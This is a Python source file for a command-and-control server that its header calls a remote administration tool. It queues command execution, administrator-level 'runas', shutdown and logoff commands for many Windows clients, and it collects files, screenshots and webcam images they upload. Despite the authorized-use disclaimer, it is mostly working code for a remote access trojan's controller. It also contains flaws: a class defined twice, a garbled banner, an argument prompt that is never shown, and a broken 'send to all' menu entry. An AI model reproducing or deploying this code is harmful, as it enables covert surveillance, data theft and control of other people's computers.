#!/usr/bin/env python3
"""
Injector Server - Remote Administration Tool
============================================
A Python-based remote administration server for managing multiple Windows clients.
This tool is for AUTHORIZED USE ONLY on systems you own or have permission to manage.

Features:
- Multi-PC management via HTTP server
- File transfer (upload/download)
- Webcam and screenshot capture
- System information gathering
- Remote command execution
- Interactive colored menu interface

Usage:
    python injector_server.py [port]
    
Default port: 8080
"""

import os
import sys
import json
import base64
import socket
import threading
import time
import shutil
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
from urllib.parse import urlparse, parse_qs, unquote
import cgi
import platform
import subprocess
import hashlib

# ANSI color codes
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'

# ASCII Art Header
ASCII_HEADER = r"""
  _____ _           _   _____                      _   
 |  ___| | ___  ___| |_|_   _|__ _ __ ___  ___  __| |  
 | |_  | |/ _ \/ __| __|| |/ _ \ '_ ` _ ` _ \/ _ \/ _` |  
 |  _| | |  __/ (__| |_ | |  __/ | | | | | | | __/ (_| |  
 |_|   |_|\___|\___|\__||_|\___|_| |_| |_| |_|\___|\__,_|  
                                                           
  _____ _   _ _____ _____ ____  _   _ _____ ____         
 |_   _| | | |_   _| ____|  _ \| | | |_   _|  _ \        
   | | | | | | | | |  _| | |_) | | | | | | | |_) |        
   | | | |_| | | | | |___|  _ <| |_| | | | |  _ <         
   |_|  \___/  |_| |_____|_| \_\\___/  |_| |_| \_\        
                                                           
"""

class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'

# Global state
clients = {}
client_lock = threading.Lock()
command_queue = {}
results = {}

# Directories
UPLOADS_DIR = "uploads"
DOWNLOADS_DIR = "downloads"
SCREENSHOTS_DIR = "screenshots"
WEBCAM_DIR = "webcam"

# Ensure directories exist
def ensure_directories():
    """Create necessary directories if they don't exist."""
    directories = [UPLOADS_DIR, DOWNLOADS_DIR, SCREENSHOTS_DIR, WEBCAM_DIR]
    for directory in directories:
        if not os.path.exists(directory):
            os.makedirs(directory, exist_ok=True)
            print(f"{Colors.OKGREEN}[+] Created directory: {directory}{Colors.ENDC}")

# Client registration
def register_client(client_id, client_info):
    """Register a new client with the server."""
    with client_lock:
        clients[client_id] = {
            'info': client_info,
            'last_seen': time.time(),
            'status': 'online'
        }
        command_queue[client_id] = []
        results[client_id] = []
        print(f"{Colors.OKGREEN}[+] New client registered: {client_id}{Colors.ENDC}")
        print(f"    Info: {client_info}")

# Generate unique client ID
def generate_client_id():
    """Generate a unique client ID based on timestamp and random hash."""
    timestamp = str(time.time()).encode()
    random_bytes = os.urandom(8)
    hash_input = timestamp + random_bytes
    return hashlib.sha256(hash_input).hexdigest()[:16]

# Command processing
def queue_command(client_id, command, args=None):
    """Queue a command for a specific client."""
    cmd = {
        'id': len(command_queue.get(client_id, [])),
        'command': command,
        'args': args or {},
        'timestamp': time.time(),
        'status': 'queued'
    }
    with client_lock:
        if client_id not in command_queue:
            command_queue[client_id] = []
        command_queue[client_id].append(cmd)
    return cmd

# HTTP Request Handler
class InjectorRequestHandler(BaseHTTPRequestHandler):
    """HTTP request handler for the injector server."""
    
    def log_message(self, format, *args):
        """Override to suppress default logging."""
        pass
    
    def do_GET(self):
        """Handle GET requests from clients."""
        parsed = urlparse(self.path)
        path = parsed.path
        query = parse_qs(parsed.query)
        
        try:
            if path == '/register':
                self.handle_register(query)
            elif path == '/command':
                self.handle_command_request(query)
            elif path == '/upload':
                self.handle_file_upload(query)
            elif path == '/download':
                self.handle_file_download(query)
            elif path == '/screenshot':
                self.handle_screenshot_upload(query)
            elif path == '/webcam':
                self.handle_webcam_upload(query)
            elif path == '/result':
                self.handle_result_submit(query)
            elif path == '/ping':
                self.handle_ping(query)
            else:
                self.send_error(404, "Not Found")
        except Exception as e:
            self.send_error(500, f"Server Error: {str(e)}")
    
    def do_POST(self):
        """Handle POST requests (file uploads, etc.)."""
        parsed = urlparse(self.path)
        path = parsed.path
        
        try:
            if path == '/upload_file':
                self.handle_file_upload_post()
            elif path == '/screenshot_upload':
                self.handle_screenshot_upload_post()
            elif path == '/webcam_upload':
                self.handle_webcam_upload_post()
            else:
                self.send_error(404, "Not Found")
        except Exception as e:
            self.send_error(500, f"Server Error: {str(e)}")
    
    def handle_register(self, query):
        """Handle client registration."""
        client_id = query.get('id', [None])[0]
        if not client_id:
            client_id = generate_client_id()
        
        client_info = {
            'hostname': query.get('hostname', ['Unknown'])[0],
            'username': query.get('username', ['Unknown'])[0],
            'os': query.get('os', ['Windows'])[0],
            'ip': self.client_address[0],
            'port': self.client_address[1]
        }
        
        register_client(client_id, client_info)
        
        response = {
            'status': 'success',
            'client_id': client_id,
            'message': 'Registered successfully'
        }
        
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(response).encode())
    
    def handle_command_request(self, query):
        """Handle command requests from clients."""
        client_id = query.get('id', [None])[0]
        
        if not client_id or client_id not in clients:
            self.send_error(400, "Invalid client ID")
            return
        
        with client_lock:
            if client_id in command_queue and command_queue[client_id]:
                cmd = command_queue[client_id].pop(0)
                cmd['status'] = 'sent'
                
                response = {
                    'status': 'success',
                    'command': cmd['command'],
                    'args': cmd['args'],
                    'command_id': cmd['id']
                }
                
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps(response).encode())
            else:
                response = {'status': 'no_commands'}
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps(response).encode())
    
    def handle_result_submit(self, query):
        """Handle command result submission from clients."""
        client_id = query.get('id', [None])[0]
        command_id = query.get('command_id', [None])[0]
        result_data = query.get('result', [None])[0]
        
        if not client_id or client_id not in clients:
            self.send_error(400, "Invalid client ID")
            return
        
        result_entry = {
            'client_id': client_id,
            'command_id': command_id,
            'result': result_data,
            'timestamp': time.time()
        }
        
        with client_lock:
            if client_id not in results:
                results[client_id] = []
            results[client_id].append(result_entry)
        
        response = {'status': 'success'}
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(response).encode())
    
    def handle_ping(self, query):
        """Handle client ping/heartbeat."""
        client_id = query.get('id', [None])[0]
        
        if client_id and client_id in clients:
            with client_lock:
                clients[client_id]['last_seen'] = time.time()
        
        response = {'status': 'pong', 'timestamp': time.time()}
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(response).encode())
    
    def handle_file_upload_post(self):
        """Handle file upload from client."""
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length)
        
        try:
            data = json.loads(post_data.decode())
            client_id = data.get('id')
            filename = data.get('filename')
            file_data = data.get('data')
            
            if not all([client_id, filename, file_data]):
                self.send_error(400, "Missing required fields")
                return
            
            # Decode base64 and save file
            decoded_data = base64.b64decode(file_data)
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            safe_filename = f"{timestamp}_{client_id}_{filename}"
            filepath = os.path.join(DOWNLOADS_DIR, safe_filename)
            
            with open(filepath, 'wb') as f:
                f.write(decoded_data)
            
            print(f"{Colors.OKGREEN}[+] File received from {client_id}: {filename}{Colors.ENDC}")
            
            response = {
                'status': 'success',
                'filename': safe_filename,
                'size': len(decoded_data)
            }
            
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps(response).encode())
            
        except Exception as e:
            self.send_error(500, f"File upload error: {str(e)}")
    
    def handle_screenshot_upload_post(self):
        """Handle screenshot upload from client."""
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length)
        
        try:
            data = json.loads(post_data.decode())
            client_id = data.get('id')
            image_data = data.get('data')
            
            if not all([client_id, image_data]):
                self.send_error(400, "Missing required fields")
                return
            
            # Decode base64 and save screenshot
            decoded_data = base64.b64decode(image_data)
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"screenshot_{timestamp}_{client_id}.png"
            filepath = os.path.join(SCREENSHOTS_DIR, filename)
            
            with open(filepath, 'wb') as f:
                f.write(decoded_data)
            
            print(f"{Colors.OKGREEN}[+] Screenshot received from {client_id}: {filename}{Colors.ENDC}")
            
            response = {
                'status': 'success',
                'filename': filename,
                'size': len(decoded_data)
            }
            
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps(response).encode())
            
        except Exception as e:
            self.send_error(500, f"Screenshot upload error: {str(e)}")
    
    def handle_webcam_upload_post(self):
        """Handle webcam image upload from client."""
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length)
        
        try:
            data = json.loads(post_data.decode())
            client_id = data.get('id')
            image_data = data.get('data')
            
            if not all([client_id, image_data]):
                self.send_error(400, "Missing required fields")
                return
            
            # Decode base64 and save webcam image
            decoded_data = base64.b64decode(image_data)
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"webcam_{timestamp}_{client_id}.jpg"
            filepath = os.path.join(WEBCAM_DIR, filename)
            
            with open(filepath, 'wb') as f:
                f.write(decoded_data)
            
            print(f"{Colors.OKGREEN}[+] Webcam image received from {client_id}: {filename}{Colors.ENDC}")
            
            response = {
                'status': 'success',
                'filename': filename,
                'size': len(decoded_data)
            }
            
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps(response).encode())
            
        except Exception as e:
            self.send_error(500, f"Webcam upload error: {str(e)}")

# Threaded HTTP Server
class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    """Threaded HTTP server for handling multiple clients."""
    daemon_threads = True
    allow_reuse_address = True

# Server Management
class InjectorServer:
    """Main server class for the remote administration tool."""
    
    def __init__(self, port=8080):
        self.port = port
        self.server = None
        self.server_thread = None
        self.running = False
    
    def start(self):
        """Start the server."""
        ensure_directories()
        
        self.server = ThreadedHTTPServer(('0.0.0.0', self.port), InjectorRequestHandler)
        self.server_thread = threading.Thread(target=self.server.serve_forever)
        self.server_thread.daemon = True
        self.server_thread.start()
        
        self.running = True
        print(f"{Colors.OKBLUE}[*] Server started on port {self.port}{Colors.ENDC}")
        print(f"{Colors.OKBLUE}[*] Access the server at: http://0.0.0.0:{self.port}{Colors.ENDC}")
    
    def stop(self):
        """Stop the server."""
        if self.server:
            self.server.shutdown()
            self.server.server_close()
        self.running = False
        print(f"{Colors.WARNING}[!] Server stopped{Colors.ENDC}")
    
    def get_clients(self):
        """Get list of connected clients."""
        with client_lock:
            return list(clients.keys())
    
    def get_client_info(self, client_id):
        """Get information about a specific client."""
        with client_lock:
            return clients.get(client_id, {}).get('info', {})
    
    def send_command(self, client_id, command, args=None):
        """Send a command to a specific client."""
        if client_id not in clients:
            print(f"{Colors.FAIL}[-] Client {client_id} not found{Colors.ENDC}")
            return False
        
        cmd = queue_command(client_id, command, args)
        print(f"{Colors.OKBLUE}[*] Command queued for {client_id}: {command}{Colors.ENDC}")
        return True
    
    def send_command_to_all(self, command, args=None):
        """Send a command to all connected clients."""
        client_ids = self.get_clients()
        if not client_ids:
            print(f"{Colors.WARNING}[!] No clients connected{Colors.ENDC}")
            return False
        
        for client_id in client_ids:
            self.send_command(client_id, command, args)
        
        print(f"{Colors.OKBLUE}[*] Command sent to all {len(client_ids)} clients: {command}{Colors.ENDC}")
        return True
    
    def get_results(self, client_id=None):
        """Get command results."""
        if client_id:
            with client_lock:
                return results.get(client_id, [])
        else:
            all_results = []
            with client_lock:
                for cid, res_list in results.items():
                    for res in res_list:
                        all_results.append(res)
            return all_results
    
    def clear_results(self, client_id=None):
        """Clear command results."""
        if client_id:
            with client_lock:
                results[client_id] = []
        else:
            with client_lock:
                for cid in results:
                    results[cid] = []

# Interactive Menu System
class InjectorMenu:
    """Interactive menu system for the remote administration tool."""
    
    def __init__(self, server):
        self.server = server
        self.commands = {
            'sysinfo': {'desc': 'Get system information', 'args': None},
            'processes': {'desc': 'List running processes', 'args': None},
            'drives': {'desc': 'List available drives', 'args': None},
            'dir': {'desc': 'List directory contents', 'args': {'path': str}},
            'exec': {'desc': 'Execute command', 'args': {'command': str}},
            'runas': {'desc': 'Run command as administrator', 'args': {'command': str}},
            'msg': {'desc': 'Send message to user', 'args': {'message': str}},
            'screenshot': {'desc': 'Capture screenshot', 'args': None},
            'webcam': {'desc': 'Capture webcam image', 'args': None},
            'reboot': {'desc': 'Reboot the system', 'args': None},
            'shutdown': {'desc': 'Shutdown the system', 'args': None},
            'logoff': {'desc': 'Log off current user', 'args': None},
        }
    
    def print_header(self):
        """Print the ASCII art header."""
        print(f"\n{Colors.HEADER}{ASCII_HEADER}{Colors.ENDC}")
        print(f"{Colors.HEADER}{'='*80}{Colors.ENDC}")
        print(f"{Colors.CYAN}Injector Remote Administration Tool{Colors.ENDC}")
        print(f"{Colors.CYAN}Server running on port {self.server.port}{Colors.ENDC}")
        print(f"{Colors.HEADER}{'='*80}{Colors.ENDC}\n")
    
    def print_clients(self):
        """Print list of connected clients."""
        clients = self.server.get_clients()
        if not clients:
            print(f"{Colors.WARNING}[!] No clients connected{Colors.ENDC}")
            return
        
        print(f"{Colors.OKBLUE}[*] Connected Clients ({len(clients)}):{Colors.ENDC}")
        for i, client_id in enumerate(clients, 1):
            info = self.server.get_client_info(client_id)
            hostname = info.get('hostname', 'Unknown')
            username = info.get('username', 'Unknown')
            ip = info.get('ip', 'Unknown')
            print(f"{Colors.OKGREEN}{i}. {client_id[:8]}...{Colors.ENDC} - {hostname} ({username}) @ {ip}")
    
    def print_available_commands(self):
        """Print available commands."""
        print(f"\n{Colors.HEADER}Available Commands:{Colors.ENDC}")
        for cmd, info in self.commands.items():
            print(f"  {Colors.CYAN}{cmd.ljust(15)}{Colors.ENDC} - {info['desc']}")
        print()
    
    def get_client_selection(self):
        """Get client selection from user."""
        clients = self.server.get_clients()
        if not clients:
            print(f"{Colors.WARNING}[!] No clients available{Colors.ENDC}")
            return None
        
        self.print_clients()
        print(f"\n{Colors.OKBLUE}[?] Select client (number or ID, 'all' for all, 'back' to cancel):{Colors.ENDC}")
        
        while True:
            choice = input(f"{Colors.OKBLUE}>> {Colors.ENDC}").strip()
            
            if choice.lower() == 'back':
                return None
            elif choice.lower() == 'all':
                return 'all'
            elif choice.isdigit():
                idx = int(choice) - 1
                if 0 <= idx < len(clients):
                    return clients[idx]
                else:
                    print(f"{Colors.FAIL}[-] Invalid selection{Colors.ENDC}")
            else:
                # Try to match client ID
                for client_id in clients:
                    if client_id.startswith(choice):
                        return client_id
                print(f"{Colors.FAIL}[-] Client not found{Colors.ENDC}")
    
    def get_command_selection(self):
        """Get command selection from user."""
        self.print_available_commands()
        print(f"{Colors.OKBLUE}[?] Select command (name or 'back' to cancel):{Colors.ENDC}")
        
        while True:
            choice = input(f"{Colors.OKBLUE}>> {Colors.ENDC}").strip()
            
            if choice.lower() == 'back':
                return None
            elif choice in self.commands:
                return choice
            else:
                print(f"{Colors.FAIL}[-] Unknown command. Available: {', '.join(self.commands.keys())}{Colors.ENDC}")
    
    def get_command_args(self, command):
        """Get arguments for a command."""
        cmd_info = self.commands.get(command, {})
        args_schema = cmd_info.get('args')
        
        if not args_schema:
            return {}
        
        args = {}
        for arg_name, arg_type in args_schema.items():
            prompt = f"{Colors.OKBLUE}[?] Enter {arg_name}:{Colors.ENDC}"
            value = input(f"{Colors.OKBLUE}>> {Colors.ENDC}").strip()
            
            if arg_type == str and value:
                args[arg_name] = value
        
        return args
    
    def confirm_destructive_command(self, command):
        """Confirm destructive commands."""
        destructive_commands = ['reboot', 'shutdown', 'logoff']
        
        if command in destructive_commands:
            confirm = input(f"{Colors.WARNING}[!] WARNING: This will {command} the remote system. Continue? (y/n): {Colors.ENDC}").strip().lower()
            return confirm == 'y'
        return True
    
    def send_command_to_client(self):
        """Send command to a specific client."""
        client_id = self.get_client_selection()
        if not client_id:
            return
        
        command = self.get_command_selection()
        if not command:
            return
        
        if not self.confirm_destructive_command(command):
            print(f"{Colors.WARNING}[!] Command cancelled{Colors.ENDC}")
            return
        
        args = self.get_command_args(command)
        
        if client_id == 'all':
            self.server.send_command_to_all(command, args)
        else:
            self.server.send_command(client_id, command, args)
        
        print(f"{Colors.OKGREEN}[+] Command sent successfully{Colors.ENDC}")
        time.sleep(1)  # Give time for command to be processed
    
    def view_results(self):
        """View command results."""
        client_id = self.get_client_selection()
        
        if client_id == 'all':
            results = self.server.get_results()
            title = "All Clients"
        elif client_id:
            results = self.server.get_results(client_id)
            title = f"Client: {client_id[:8]}..."
        else:
            return
        
        if not results:
            print(f"{Colors.WARNING}[!] No results available for {title}{Colors.ENDC}")
            return
        
        print(f"\n{Colors.HEADER}Results for {title}:{Colors.ENDC}")
        for i, result in enumerate(results, 1):
            timestamp = datetime.fromtimestamp(result.get('timestamp', 0)).strftime("%Y-%m-%d %H:%M:%S")
            print(f"\n{Colors.OKBLUE}Result {i} - {timestamp}:{Colors.ENDC}")
            print(f"  Command ID: {result.get('command_id', 'N/A')}")
            print(f"  Result: {result.get('result', 'No result')}")
            print(f"  {Colors.HEADER}{'-'*60}{Colors.ENDC}")
        
        # Clear results after viewing
        self.server.clear_results(client_id if client_id != 'all' else None)
        input(f"\n{Colors.OKBLUE}[?] Press Enter to continue...{Colors.ENDC}")
    
    def view_screenshots(self):
        """View available screenshots."""
        if not os.path.exists(SCREENSHOTS_DIR):
            print(f"{Colors.WARNING}[!] No screenshots directory{Colors.ENDC}")
            return
        
        files = [f for f in os.listdir(SCREENSHOTS_DIR) if f.endswith(('.png', '.jpg', '.jpeg'))]
        if not files:
            print(f"{Colors.WARNING}[!] No screenshots available{Colors.ENDC}")
            return
        
        print(f"\n{Colors.HEADER}Available Screenshots:{Colors.ENDC}")
        for i, filename in enumerate(files, 1):
            filepath = os.path.join(SCREENSHOTS_DIR, filename)
            size = os.path.getsize(filepath)
            mtime = datetime.fromtimestamp(os.path.getmtime(filepath)).strftime("%Y-%m-%d %H:%M:%S")
            print(f"{Colors.OKGREEN}{i}. {filename}{Colors.ENDC} ({size} bytes, {mtime})")
        
        print(f"\n{Colors.OKBLUE}[?] Enter number to view, 'open' to open directory, or 'back':{Colors.ENDC}")
        choice = input(f"{Colors.OKBLUE}>> {Colors.ENDC}").strip()
        
        if choice.lower() == 'open':
            if platform.system() == 'Windows':
                os.startfile(SCREENSHOTS_DIR)
            elif platform.system() == 'Linux':
                subprocess.run(['xdg-open', SCREENSHOTS_DIR])
            elif platform.system() == 'Darwin':
                subprocess.run(['open', SCREENSHOTS_DIR])
        elif choice.isdigit():
            idx = int(choice) - 1
            if 0 <= idx < len(files):
                filepath = os.path.join(SCREENSHOTS_DIR, files[idx])
                if platform.system() == 'Windows':
                    os.startfile(filepath)
                elif platform.system() == 'Linux':
                    subprocess.run(['xdg-open', filepath])
                elif platform.system() == 'Darwin':
                    subprocess.run(['open', filepath])
    
    def view_webcam_images(self):
        """View available webcam images."""
        if not os.path.exists(WEBCAM_DIR):
            print(f"{Colors.WARNING}[!] No webcam directory{Colors.ENDC}")
            return
        
        files = [f for f in os.listdir(WEBCAM_DIR) if f.endswith(('.png', '.jpg', '.jpeg'))]
        if not files:
            print(f"{Colors.WARNING}[!] No webcam images available{Colors.ENDC}")
            return
        
        print(f"\n{Colors.HEADER}Available Webcam Images:{Colors.ENDC}")
        for i, filename in enumerate(files, 1):
            filepath = os.path.join(WEBCAM_DIR, filename)
            size = os.path.getsize(filepath)
            mtime = datetime.fromtimestamp(os.path.getmtime(filepath)).strftime("%Y-%m-%d %H:%M:%S")
            print(f"{Colors.OKGREEN}{i}. {filename}{Colors.ENDC} ({size} bytes, {mtime})")
        
        print(f"\n{Colors.OKBLUE}[?] Enter number to view, 'open' to open directory, or 'back':{Colors.ENDC}")
        choice = input(f"{Colors.OKBLUE}>> {Colors.ENDC}").strip()
        
        if choice.lower() == 'open':
            if platform.system() == 'Windows':
                os.startfile(WEBCAM_DIR)
            elif platform.system() == 'Linux':
                subprocess.run(['xdg-open', WEBCAM_DIR])
            elif platform.system() == 'Darwin':
                subprocess.run(['open', WEBCAM_DIR])
        elif choice.isdigit():
            idx = int(choice) - 1
            if 0 <= idx < len(files):
                filepath = os.path.join(WEBCAM_DIR, files[idx])
                if platform.system() == 'Windows':
                    os.startfile(filepath)
                elif platform.system() == 'Linux':
                    subprocess.run(['xdg-open', filepath])
                elif platform.system() == 'Darwin':
                    subprocess.run(['open', filepath])
    
    def upload_file_to_client(self):
        """Upload file to a client."""
        client_id = self.get_client_selection()
        if not client_id or client_id == 'all':
            print(f"{Colors.WARNING}[!] Please select a single client for file upload{Colors.ENDC}")
            return
        
        if not os.path.exists(UPLOADS_DIR):
            print(f"{Colors.WARNING}[!] Uploads directory not found{Colors.ENDC}")
            return
        
        files = [f for f in os.listdir(UPLOADS_DIR) if os.path.isfile(os.path.join(UPLOADS_DIR, f))]
        if not files:
            print(f"{Colors.WARNING}[!] No files available in uploads directory{Colors.ENDC}")
            return
        
        print(f"\n{Colors.HEADER}Available Files in {UPLOADS_DIR}:{Colors.ENDC}")
        for i, filename in enumerate(files, 1):
            filepath = os.path.join(UPLOADS_DIR, filename)
            size = os.path.getsize(filepath)
            print(f"{Colors.OKGREEN}{i}. {filename}{Colors.ENDC} ({size} bytes)")
        
        print(f"\n{Colors.OKBLUE}[?] Select file to upload (number or filename):{Colors.ENDC}")
        choice = input(f"{Colors.OKBLUE}>> {Colors.ENDC}").strip()
        
        selected_file = None
        if choice.isdigit():
            idx = int(choice) - 1
            if 0 <= idx < len(files):
                selected_file = files[idx]
        else:
            for filename in files:
                if filename == choice:
                    selected_file = filename
                    break
        
        if not selected_file:
            print(f"{Colors.FAIL}[-] File not found{Colors.ENDC}")
            return
        
        filepath = os.path.join(UPLOADS_DIR, selected_file)
        
        # Read file and encode as base64
        try:
            with open(filepath, 'rb') as f:
                file_data = base64.b64encode(f.read()).decode()
            
            args = {
                'filename': selected_file,
                'data': file_data
            }
            
            self.server.send_command(client_id, 'upload_file', args)
            print(f"{Colors.OKGREEN}[+] File upload command sent to {client_id}{Colors.ENDC}")
            
        except Exception as e:
            print(f"{Colors.FAIL}[-] Error reading file: {str(e)}{Colors.ENDC}")
    
    def download_file_from_client(self):
        """Request file download from a client."""
        client_id = self.get_client_selection()
        if not client_id or client_id == 'all':
            print(f"{Colors.WARNING}[!] Please select a single client for file download{Colors.ENDC}")
            return
        
        print(f"\n{Colors.OKBLUE}[?] Enter path of file to download from client:{Colors.ENDC}")
        file_path = input(f"{Colors.OKBLUE}>> {Colors.ENDC}").strip()
        
        if not file_path:
            print(f"{Colors.WARNING}[!] No file path provided{Colors.ENDC}")
            return
        
        args = {'path': file_path}
        self.server.send_command(client_id, 'download_file', args)
        print(f"{Colors.OKGREEN}[+] File download command sent to {client_id}{Colors.ENDC}")
        print(f"{Colors.OKBLUE}[*] Check the downloads directory for the file{Colors.ENDC}")
    
    def show_main_menu(self):
        """Display the main menu."""
        self.print_header()
        
        menu_items = [
            ("Send command to specific PC", self.send_command_to_client),
            ("Send command to all PCs", lambda: self.send_command_to_client() if self.server.send_command_to_all('msg', {'message': 'test'}) else None),
            ("View command results", self.view_results),
            ("View screenshots", self.view_screenshots),
            ("View webcam images", self.view_webcam_images),
            ("Upload file to PC", self.upload_file_to_client),
            ("Download file from PC", self.download_file_from_client),
            ("Exit", None)
        ]
        
        while True:
            print(f"{Colors.HEADER}MAIN MENU:{Colors.ENDC}")
            for i, (desc, _) in enumerate(menu_items, 1):
                print(f"{Colors.OKGREEN}{i}. {desc}{Colors.ENDC}")
            
            print(f"\n{Colors.OKBLUE}[?] Select an option (1-{len(menu_items)}):{Colors.ENDC}")
            choice = input(f"{Colors.OKBLUE}>> {Colors.ENDC}").strip()
            
            if choice.isdigit():
                idx = int(choice) - 1
                if 0 <= idx < len(menu_items):
                    if idx == len(menu_items) - 1:  # Exit
                        print(f"{Colors.WARNING}[!] Exiting...{Colors.ENDC}")
                        self.server.stop()
                        sys.exit(0)
                    else:
                        action = menu_items[idx][1]
                        if action:
                            action()
                else:
                    print(f"{Colors.FAIL}[-] Invalid selection{Colors.ENDC}")
            else:
                print(f"{Colors.FAIL}[-] Please enter a number{Colors.ENDC}")
            
            print()
    
    def run(self):
        """Run the interactive menu."""
        try:
            self.show_main_menu()
        except KeyboardInterrupt:
            print(f"\n{Colors.WARNING}[!] Server shutting down...{Colors.ENDC}")
            self.server.stop()
            sys.exit(0)

# Main function
def main():
    """Main entry point."""
    print(f"{Colors.HEADER}{ASCII_HEADER}{Colors.ENDC}")
    print(f"{Colors.CYAN}Injector Remote Administration Tool{Colors.ENDC}")
    print(f"{Colors.WARNING}WARNING: This tool is for AUTHORIZED USE ONLY on systems you own or have permission to manage.{Colors.ENDC}")
    print(f"{Colors.WARNING}Unauthorized use may violate laws and ethical guidelines.{Colors.ENDC}")
    print()
    
    # Parse command line arguments
    port = 8080
    if len(sys.argv) > 1:
        try:
            port = int(sys.argv[1])
        except ValueError:
            print(f"{Colors.FAIL}[-] Invalid port number. Using default: 8080{Colors.ENDC}")
    
    # Create and start server
    server = InjectorServer(port)
    server.start()
    
    # Start interactive menu
    menu = InjectorMenu(server)
    menu.run()

if __name__ == '__main__':
    main()